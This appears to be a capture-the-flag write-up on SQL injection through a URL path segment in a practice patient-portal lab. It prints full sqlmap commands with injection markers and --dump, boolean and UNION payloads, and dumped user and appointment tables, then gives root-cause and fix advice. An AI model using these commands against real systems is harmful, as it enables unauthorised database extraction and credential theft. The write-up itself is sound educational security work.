---
title: "MedNote-SQLi-21.07.2026"
description: "Recon on a patient portal's appointment-cancellation flow revealed an unsanitized ID segment in the URL path. sqlmap confirmed boolean-based and UNION-based SQLi against SQLite, leading to a full dump of the users table and the flag."
date: 2026-07-21
tags:
  - mednote
  - bugforge
  - web
  - sqli
  - api-security
  - broken-access-control
---

> [!info] Target / Context
> **MedNode** - **Daily** Challenge on Bugforge (Easy, 10 points). Blackbox web application: a patient-facing appointment booking portal. Authentication via JWT (`Authorization: Bearer`), backed by a SQLite database exposed through an Express API.

## TL;DR

MedNode lets a patient request appointments and view/cancel their own upcoming appointments. Mapping the "cancel appointment" action showed the frontend calling `POST /api/appointments/{id}/cancel`, where `{id}` is a raw numeric path segment, not a query parameter. The challenge hint ("SQLi in the path? No way...") pointed straight at that segment. Throwing sqlmap at the path parameter confirmed a **boolean-based blind** and a **7-column UNION-based** SQL injection against a SQLite backend, with no need to touch the JSON body at all. From there, a full dump of the `users`, `appointments`, and `reasons` tables recovered every account's credentials, including the flag stored in the `password` column.

---

## Recon / Application Mapping

After registering a standard patient account (`asd` / password `asdasd`), I logged in and walked through the app's core flow:

- **Request an Appointment** — a form with Doctor, Date, Time, and Reason dropdowns, submitting a new appointment request.
- **My Appointments** — a table listing the logged-in patient's own appointments (date, time, doctor, reason, status), each row with a cancel action.

Before touching Burp, I ran a quick static recon pass over the page's own scripts (endpoints, potential DOM sinks, source maps, external scripts). It surfaced the app's two frontend bundles (`/js/patient.js`, `/css/style.css`) and a stray `innerHTML` sink, but nothing that pointed at the backend directly — the real lead had to come from watching the network traffic.

Clicking **Cancel** on an appointment row fired:

```http
POST /api/appointments/1/cancel HTTP/2
Host: lab-XXXX-app.bugforge.io
Authorization: Bearer <JWT>
```

No body, no query string — the only user-influenced input in the entire request is the appointment `id` sitting in the URL path itself. That is an unusual place to look for injection (most tooling defaults to query/body parameters), which lines up neatly with the challenge's own hint: *"SQLi in the path? No way..."*

---

## The Process

### Attempt 1 — Confirming the Path Segment Is Live

Rather than guess manually, I pointed `sqlmap` directly at the path segment using its custom injection marker (`*`), authenticating as the low-privilege `asd` patient account:

```bash
sqlmap -u "https://lab-XXXX-app.bugforge.io/api/appointments/1*/cancel" \
  --method=POST \
  --header="Authorization: Bearer <JWT>" \
  --level=5 \
  --risk=3 \
  --batch
```

sqlmap flagged the `#1*` path token as dynamic and, despite the endpoint returning HTTP 403/404/500 for most malformed payloads, it still found a stable, injectable condition underneath the noise:

```
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: .../api/appointments/1 AND 2918=2918/cancel
```

The heuristic fingerprint also called out **SQLite** as the backend early on, which sqlmap later confirmed via active fingerprinting.

### Attempt 2 — Escalating to UNION

With a confirmed boolean-based point, sqlmap automatically widened its column-count probing using `ORDER BY` and landed on **7 columns**:

```
Type: UNION query
Title: Generic UNION query (NULL) - 7 columns
Payload: .../api/appointments/-5968 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(...)||CHAR(...)||CHAR(...),NULL-- cGIE/cancel
```

This is the more useful primitive here: the boolean-based technique alone would mean blind, one-bit-at-a-time extraction, but a working UNION means the endpoint's response actually reflects query output somewhere in a way sqlmap can read back directly — perfect for a full dump.

---

## Exploit / Proof of Concept

With the injection point and DBMS confirmed, I re-ran sqlmap targeting the same path parameter with `--dump`:

```bash
sqlmap -u "https://lab-XXXX-app.bugforge.io/api/appointments/1*/cancel" \
  --method=POST \
  --header="Authorization: Bearer <JWT>" \
  --level=5 \
  --risk=3 \
  --batch \
  --dbms=SQLite \
  --dump
```

sqlmap resumed the stored injection point and started enumerating every table it could reach off the current database, with no further input from me:

```
Database: <current>
Table: appointments
+----+-----------+-----------+------------+-----------+------------------+------------------+
| id | doctor_id | reason_id | patient_id | status    | appointment_date | appointment_time |
+----+-----------+-----------+------------+-----------+------------------+------------------+
| 1  | 1         | 1         | 3          | confirmed | 2026-07-24       | 09:00            |
| ...
```

The interesting table, of course, is `users`:

```
Database: <current>
Table: users
+----+---------+-----------------------------------------+----------+------------------+
| id | role    | password                                 | username | full_name        |
+----+---------+-------------------------------------------+----------+------------------+
| 1  | doctor  | bug{nmNeANIcd7digbaHcdCvqrH8u4n0viR2}    | dr.smith | Dr. Sarah Smith  |
| 2  | doctor  | bug{nmNeANIcd7digbaHcdCvqrH8u4n0viR2}    | dr.jones | Dr. Marcus Jones |
| 3  | patient | bug{nmNeANIcd7digbaHcdCvqrH8u4n0viR2}    | jeremy   | jeremy           |
| 4  | patient | bug{nmNeANIcd7digbaHcdCvqrH8u4n0viR2}    | jessamy  | jessamy          |
| 5  | patient | $2a$10$vqaboMEVaTjM6MtNrvUu1O9ZmS3CgnUMBh8byaGOaewQwbP8QikK2 | asd | asd |
+----+---------+---------------------------------------------+----------+------------------+
```

Every seeded account (doctors and demo patients) shares the same plaintext value in its `password` column — which is the flag itself. Only the account I registered myself (`asd`) has an actual bcrypt hash, confirming that new signups get hashed correctly while the seeded demo data was left with the flag sitting in cleartext.

**Flag:** `bug{nmNeANIcd7digbaHcdCvqrH8u4n0viR2}`

---

## Root Cause & Fix

### Root cause

1. **Unsanitized path parameter interpolated into SQL.** The `id` segment of `/api/appointments/{id}/cancel` was concatenated directly into the query (likely a raw string-built `WHERE id = <id>` clause) instead of being passed as a bound parameter.
2. **Attack surface hiding in the URL path rather than the query string or body.** Because the only "input" here is a path segment, it's easy to overlook during manual testing that focuses on parameters, JSON bodies, or headers — the app doesn't advertise it as user-controlled data, but it is.
3. **Overly permissive error handling.** Despite returning HTTP 403/404/500 for most malformed payloads, the app still leaked a stable boolean-based oracle and a working UNION channel underneath those error codes, giving sqlmap enough signal to fully automate extraction.

### Fix

1. **Use parameterized queries / prepared statements** for every value that reaches the database, including path parameters — never string-concatenate user-controlled path or query data into SQL.
2. **Validate and coerce path parameters at the routing layer** (e.g. enforce that `id` matches `^\d+$` before it ever reaches the data layer), rejecting non-numeric input outright instead of letting it flow into a query.
3. **Never store credentials or secrets in plaintext.** The `password` column here held the flag in cleartext for every seeded account; production systems should hash and salt credentials (e.g. bcrypt, as was correctly done for self-registered users) universally, with no exceptions for seed/demo data.
4. **Least-privilege database accounts.** The API's DB user should not have read access to unrelated tables (`users`, `reasons`) from an endpoint whose only legitimate job is to flip a single appointment's status.

---

## Takeaway

Injection points don't only live in query strings and JSON bodies — a raw ID sitting in a URL path segment is just as much user-controlled input, and REST-style routes (`/resource/{id}/action`) make it easy to forget that. When a hint (or your own gut) says "surely not the path," that's exactly where to point sqlmap's custom injection marker next.